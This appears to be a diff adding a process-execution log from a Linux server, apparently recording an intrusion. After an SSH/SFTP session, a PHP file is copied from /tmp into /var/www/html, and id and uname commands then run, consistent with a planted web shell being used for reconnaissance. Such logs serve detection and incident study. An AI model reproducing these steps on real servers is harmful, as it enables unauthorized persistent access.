@@ -1,0 +1,48 @@
+22:12:20Z  /usr/sbin/sshd -D -R
+22:12:20Z  /lib/systemd/systemd-user-runtime-dir start 1000
+22:12:20Z  /lib/systemd/systemd --user
+22:12:20Z  /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator
+22:12:20Z  /bin/bash /usr/lib/systemd/user-environment-generators/90gpg-agent
+22:12:20Z  awk -F: 424547494E7B7265743D317D202F5E6770672D6167656E743A2F7B696620282435203D3D2022312229207B207265743D303B20657869742030207D207D20454E44207B65786974207265747D
+
+22:12:20Z  gpgconf --check-options gpg-agent
+22:12:20Z  gpg-agent --gpgconf-test
+22:12:20Z  gpgconf --list-options gpg-agent
+22:12:20Z  awk -F: 2F5E656E61626C652D7373682D737570706F72743A2F7B207072696E7420243130207D
+
+22:12:20Z  gpg-agent --dump-option-table
+22:12:20Z  gpg-agent --gpgconf-list
+22:12:20Z  /usr/lib/systemd/user-generators/systemd-xdg-autostart-generator /run/user/1000/systemd/generator /run/user/1000/systemd/generator.early /run/user/1000/systemd/generator.late
+22:12:20Z  sh -c 2F7573722F62696E2F656E76202D6920504154483D2F7573722F6C6F63616C2F7362696E3A2F7573722F6C6F63616C2F62696E3A2F7573722F7362696E3A2F7573722F62696E3A2F7362696E3A2F62696E2072756E2D7061727473202D2D6C7362737973696E6974202F6574632F7570646174652D6D6F74642E64203E202F72756E2F6D6F74642E64796E616D69632E6E6577
+
+22:12:20Z  /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+22:12:20Z  run-parts --lsbsysinit /etc/update-motd.d
+22:12:20Z  /bin/sh /etc/update-motd.d/10-uname
+22:12:20Z  uname -snrvm
+22:12:20Z  /bin/sh /etc/update-motd.d/92-unattended-upgrades
+22:12:20Z  /bin/sh /usr/share/unattended-upgrades/update-motd-unattended-upgrades
+22:12:20Z  bash -c /usr/lib/openssh/sftp-server
+22:12:20Z  /usr/lib/openssh/sftp-server
+22:12:20Z  /usr/sbin/sshd -D -R
+22:12:20Z  sh -c 2F7573722F62696E2F656E76202D6920504154483D2F7573722F6C6F63616C2F7362696E3A2F7573722F6C6F63616C2F62696E3A2F7573722F7362696E3A2F7573722F62696E3A2F7362696E3A2F62696E2072756E2D7061727473202D2D6C7362737973696E6974202F6574632F7570646174652D6D6F74642E64203E202F72756E2F6D6F74642E64796E616D69632E6E6577
+
+22:12:20Z  /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+22:12:20Z  run-parts --lsbsysinit /etc/update-motd.d
+22:12:20Z  /bin/sh /etc/update-motd.d/10-uname
+22:12:20Z  uname -snrvm
+22:12:20Z  /bin/sh /etc/update-motd.d/92-unattended-upgrades
+22:12:20Z  /bin/sh /usr/share/unattended-upgrades/update-motd-unattended-upgrades
+22:12:20Z  bash -c 7375646F206370202F746D702F75706461746573322E706870202F7661722F7777772F68746D6C2F75706461746573322E7068703B207375646F2073686132353673756D202F7661722F7777772F68746D6C2F75706461746573322E706870
+
+22:12:20Z  sudo cp /tmp/updates2.php /var/www/html/updates2.php
+22:12:20Z  cp /tmp/updates2.php /var/www/html/updates2.php
+22:12:20Z  sudo sha256sum /var/www/html/updates2.php
+22:12:20Z  sha256sum /var/www/html/updates2.php
+22:12:24Z  sh -c id
+22:12:24Z  id
+22:12:24Z  sh -c 756E616D65202D61
+
+22:12:24Z  uname -a
+22:12:28Z  sh -c id
+22:12:28Z  id
+22:12:31Z  /lib/systemd/systemd-user-runtime-dir stop 1000
